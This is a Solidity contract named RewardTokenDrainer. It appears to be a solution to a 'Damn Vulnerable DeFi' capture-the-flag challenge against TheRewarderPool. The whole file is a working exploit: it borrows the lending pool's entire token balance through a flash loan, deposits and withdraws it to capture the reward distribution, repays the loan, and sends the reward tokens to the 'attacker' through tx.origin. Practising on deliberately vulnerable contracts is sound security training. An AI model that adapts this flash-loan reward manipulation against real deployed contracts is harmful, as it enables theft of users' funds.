// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";


contract RewardTokenDrainer {
	using Address for address payable;

	address rewarderPoolAddress;
    address flashLoanerPoolAddress;

	constructor (address _rewarderPoolAddress, address _flashLoanerPoolAddress) {
        rewarderPoolAddress = _rewarderPoolAddress;
        flashLoanerPoolAddress = _flashLoanerPoolAddress;
    }

    function drain() external  {
        FlashLoanerPool flp = FlashLoanerPool(flashLoanerPoolAddress);
        TheRewarderPool trp = TheRewarderPool(rewarderPoolAddress);
        DamnValuableToken dvt = trp.liquidityToken();
        flp.flashLoan(dvt.balanceOf(flashLoanerPoolAddress));        
    }

    function receiveFlashLoan(uint256 amount) external payable {
        TheRewarderPool trp = TheRewarderPool(rewarderPoolAddress);
        DamnValuableToken dvt = trp.liquidityToken();
        RewardToken rt = trp.rewardToken();

    	//deposit
        dvt.approve(address(trp), amount);
        trp.deposit(amount);

        //withdraw
        trp.withdraw(amount);

        //payback
        dvt.transfer(flashLoanerPoolAddress, amount);

        //transfer reward to attacker
        rt.transfer(tx.origin, rt.balanceOf(address(this)));
    }

    fallback() external payable {}
}